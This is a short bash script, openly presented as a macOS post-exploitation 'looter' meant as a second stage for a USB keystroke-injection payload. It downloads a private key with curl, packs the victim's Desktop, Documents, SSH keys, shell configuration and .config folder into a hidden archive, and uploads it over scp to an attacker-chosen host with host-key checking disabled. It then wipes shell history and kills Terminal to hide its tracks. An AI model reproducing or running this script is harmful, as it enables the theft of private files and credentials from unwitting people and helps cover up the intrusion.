#!/bin/basho
# 
# MacOS Post explotation looter
# ----------------------- 

# This script will loot the Desktop and Documents directories and some other important files.
# The looted files will be compressed and uploaded over SCP to the set destination
# Originally this script was written as a second stage of a Duckyscript payload, but can be used without it.

# Usage:
#  - Upload the pivate key to any web server (for external just use dropbox).
#  - Set the URL to the key uploaded.
#  - Set the SSH server address
#  - Run! - The lootfile will be saved as .loot.tgz on the remote host.



SSH_HOST=""
SSH_USER=""
SSH_KEY_URL=""
LOCAL_LOOT_PATH="/tmp/.s/.t/.e/.a/.l/"
REMOTE_LOOT_PATH="~/demo/"

cd $HOME ; find . | grep -v .git > $LOCAL_LOOT_PATH/home_dir_list.txt
cd $HOME/Downloads ; find . | grep -v .git > $LOCAL_LOOT_PATH/downloads_dir_list.txt

mkdir -p $LOCAL_LOOT_PATH
curl -s $SSH_KEY_URL -o $LOCAL_LOOT_PATH/.s 
chmod 600 $LOCAL_LOOT_PATH/.s

cd $LOCAL_LOOT_PATH
tar cfz .loot.tgz $HOME/Desktop $HOME/Documents $HOME/.ssh $HOME/.bash* $HOME/.config $HOME/.zsh*

scp -o StrictHostKeyChecking=no -i $LOCAL_LOOT_PATH/.s $LOCAL_LOOT_PATH/.loot.tgz ${SSH_USER}@${SSH_HOST}:$REMOTE_LOOT_PATH

set -e && rm -rf /tmp/.s $HOME/.bash_history $HOME/.zsh_history && history -c

killall Terminal
